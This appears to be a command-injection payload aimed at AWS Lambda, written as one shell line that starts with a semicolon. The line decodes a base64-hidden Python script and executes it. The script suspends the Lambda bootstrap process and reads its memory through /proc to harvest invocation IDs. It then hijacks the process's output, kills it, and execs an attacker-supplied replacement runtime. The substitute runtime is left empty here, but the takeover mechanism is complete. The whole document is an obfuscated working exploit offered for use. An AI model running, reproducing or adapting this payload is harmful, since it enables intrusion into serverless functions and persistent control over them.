; switch_runtime_b64="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMyAKaW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCgpERUZBVUxUX1JVTlRJTUVfUEFUSCA9ICIvdG1wL3J1bnRpbWUiCklOVk9LRV9SRUdFWCA9IGInKFswLTlhLXpdezh9LVswLTlhLXpdezR9LVswLTlhLXpdezR9LVswLTlhLXpdezR9LVswLTlhLXpdezEyfSknCklOVk9LRV9NSU5fTEVOID0gMzYKCkRFRkFVTFRfTUFYX01FTSA9ICAxMjggKiAxMDI0ICogMTAyNCAgIyAxMjhNQiwgdGhlIG1pbiBsYW1iZGEgbWVtb3J5IGxpbWl0CmlmICJBV1NfTEFNQkRBX0ZVTkNUSU9OX01FTU9SWV9TSVpFIiBpbiBvcy5lbnZpcm9uOgogICAgbGFtYmRhX2xpbWl0ID0gaW50KG9zLmVudmlyb25bIkFXU19MQU1CREFfRlVOQ1RJT05fTUVNT1JZX1NJWkUiXSkgLyAxMAogICAgbGFtYmRhX2xpbWl0ID0gbGFtYmRhX2xpbWl0ICogMTAyNCAqIDEwMjQgICMgdG8gTUIKZWxzZToKICAgIGxhbWJkYV9saW1pdCA9IERFRkFVTFRfTUFYX01FTQpNQVhfTUVNID0gaW50KDAuOCAqIGxhbWJkYV9saW1pdCkgIyA4MCUgb2YgbWVtb3J5IGxpbWl0CgpTVERPVVRfRklMRU5PID0gMQpTVERFUlJfRklMRU5PID0gMgoKZGVmIG1haW4oKToKICAgIHBpZCA9IG9zLnBvcGVuKCJwZ3JlcCAtZm4gJ3B5dGhvbi4qYm9vdHN0cmFwJyIpLnJlYWQoKQogICAgaWYgKG5vdCBwaWQpIG9yIChub3QgcGlkLnJzdHJpcCgpLmlzZGlnaXQoKSk6CiAgICAgICAgIyBNYXliZSB3ZSBhbHJlYWR5IHN3aXRjaGVkIGl0LCBsZXQncyB0cnkgdG8gc3dpdGNoIGFnYWluCiAgICAgICAgcHJpbnQoIlshXSBDb3VsZG4ndCBmaW5kIHRoZSBib290c3RyYXAgcHJvY2VzcywgY2hlY2tpbmcgaWYgd2UgYWxyZWFkeSBzd2l0Y2hlZCBpdC4uLiIpCiAgICAgICAgcGlkID0gb3MucG9wZW4oInBncmVwIC1mbiAne30nIi5mb3JtYXQoREVGQVVMVF9SVU5USU1FX1BBVEgpKS5yZWFkKCkgCiAgICAgICAgaWYgKG5vdCBwaWQpIG9yIChub3QgcGlkLnJzdHJpcCgpLmlzZGlnaXQoKSk6CiAgICAgICAgICAgIHByaW50KCJbIV0gQ291bGRuJ3QgZmluZCB0aGUgYm9vdHN0cmFwIHByb2Nlc3Mgb3Igb3VyIG5ldyBydW50aW1lLCAiICsgXAogICAgICAgICAgICAgICAgICAibWF5YmUgc29tZW9uZSBlbHNlIGFscmVhZHkgc3dpdGNoZWQgdGhlIHJ1bnRpbWU/IChvciBBV1MgY2hhbmdlZCB0aGUgYXJjaGl0ZWN0dXJlKSIpCiAgICAgICAgICAgIHJldHVybgoKICAgIHBpZCA9IHBpZC5yc3RyaXAoKQogICAgc2lnbmFsX3Byb2Nlc3MoIlNUT1AiLCBwaWQpCgogICAgcG9zc2libGVfaW52b2tlX2lkcyA9IGV4dHJhY3RfaW52b2tlX2lkKHBpZCkKICAgIGlmIGxlbihwb3NzaWJsZV9pbnZva2VfaWRzKSA9PSAwOgogICAgICAgIHByaW50KCJbIV0gRmFpbGVkIHRvIGV4dHJhY3QgaW52b2tlIGlkIikKICAgICAgICBzaWduYWxfcHJvY2VzcygiQ09OVCIsIHBpZCkKICAgICAgICByZXR1cm4KCiAgICBjb3B5X3N0ZG91dF9zdGRlcnIocGlkKQogICAgc2lnbmFsX3Byb2Nlc3MoImtpbGwiLCBwaWQpCgogICAgbmV3X3J1bnRpbWVfcGF0aCA9IERFRkFVTFRfUlVOVElNRV9QQVRICiAgICBvcy5jaG1vZChuZXdfcnVudGltZV9wYXRoLCAwbzc3NykKICAgIGFyZ3MgPSBbbmV3X3J1bnRpbWVfcGF0aF0gKyBwb3NzaWJsZV9pbnZva2VfaWRzCiAgICBvcy5leGVjdihuZXdfcnVudGltZV9wYXRoLCBhcmdzKQoKIyBTZW5kcyBzaWduYWwgdG8gcHJvY2VzcwpkZWYgc2lnbmFsX3Byb2Nlc3Moc2lnbmFsLCBwaWQpOgogICAgY21kID0gImtpbGwgLXt9IHt9Ii5mb3JtYXQoc2lnbmFsLCBwaWQpCiAgICBvcy5wb3BlbihjbWQpLnJlYWQoKQoKCmRlZiBleHRyYWN0X2ludm9rZV9pZChwaWQpOgogICAgbWF0Y2hlcyA9IFtdCgogICAgIyBhY2Nlc3MgcHJvY2VzcyBtZW1vcnkKICAgIG1hcHNfZmlsZSA9IG9wZW4oIi9wcm9jL3t9L21hcHMiLmZvcm1hdChwaWQpLCAncicpCiAgICBtZW1fZmlsZSA9IG9wZW4oIi9wcm9jL3t9L21lbSIuZm9ybWF0KHBpZCksICdyYicsIDApCgogICAgbWFwcyA9IG1hcHNfZmlsZS5yZWFkbGluZXMoKQogICAgZm9yIG1hcF9saW5lIGluIG1hcHM6CiAgICAgICAgIyBXZSBuZWVkIGxvb2tpbmcgZm9yIGEgZHluYW1pYyB2YWx1ZSwgc2hvdWxkIHJlc2lkZSBpbiBhIHJlYWQgd3JpdGUgbWVtb3J5IHJlZ2lvbgogICAgICAgIG0gPSByZS5tYXRjaChyJyhbMC05QS1GYS1mXSspLShbMC05QS1GYS1mXSspIHJ3JywgbWFwX2xpbmUpCiAgICAgICAgaWYgbSA9PSBOb25lOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIG1lbV9zdGFydCA9IGludChtLmdyb3VwKDEpLCAxNikKICAgICAgICBtZW1fZW5kID0gaW50KG0uZ3JvdXAoMiksIDE2KSAKICAgICAgICBtZW1fbGVuID0gbWVtX2VuZCAtIG1lbV9zdGFydAogICAgICAgIGlmIG1lbV9sZW4gPiBNQVhfTUVNOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIHRyeToKICAgICAgICAgICAgbWVtX2ZpbGUuc2VlayhtZW1fc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgICAgIG1lbV9jaHVuayA9IG1lbV9maWxlLnJlYWQobWVtX2xlbikgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICBleGNlcHQgKE9TRXJyb3IgLElPRXJyb3IsIE92ZXJmbG93RXJyb3IpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIG1hdGNoZXMgKz0gcGFyc2VfbWF0Y2hlc19mcm9tX2NodW5rKG1lbV9jaHVuaykKCiAgICByZXR1cm4gbGlzdChzZXQobWF0Y2hlcykpCgpkZWYgcGFyc2VfbWF0Y2hlc19mcm9tX2NodW5rKGNodW5rKToKICAgIGlmIGxlbihjaHVuaykgPCBJTlZPS0VfTUlOX0xFTjoKICAgICAgICByZXR1cm4gW10KCiAgICBtYXRjaGVzID0gW10KCiAgICBmb3IgbSBpbiByZS5maW5kaXRlcihJTlZPS0VfUkVHRVgsIGNodW5rKToKICAgICAgICBmb3VuZF9pbnZva2VfaWQgPSBtLmdyb3VwKDEpCiAgICAgICAgbWF0Y2hlcy5hcHBlbmQoc3RyKGZvdW5kX2ludm9rZV9pZCwgImFzY2lpIikpCgogICAgcmV0dXJuIG1hdGNoZXMKCgpkZWYgY29weV9zdGRvdXRfc3RkZXJyKHBpZCk6CiAgICBwYXRoID0gIi9wcm9jL3t9L2ZkLzEiLmZvcm1hdChwaWQpCiAgICBib290c3RyYXBfc3Rkb3V0ID0gb3Mub3BlbihwYXRoLCBvcy5PX1dST05MWSkKICAgIG9zLmR1cDIoYm9vdHN0cmFwX3N0ZG91dCwgU1RET1VUX0ZJTEVOTykKICAgIG9zLmR1cDIoYm9vdHN0cmFwX3N0ZG91dCwgU1RERVJSX0ZJTEVOTykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg==" ; new_runtime_b64=""; echo -n $new_runtime_b64 | base64 -d > /tmp/runtime;  echo -n $switch_runtime_b64 | base64 -d > /tmp/switch; chmod +x /tmp/switch; exec /tmp/switch; echo 'unexpected' 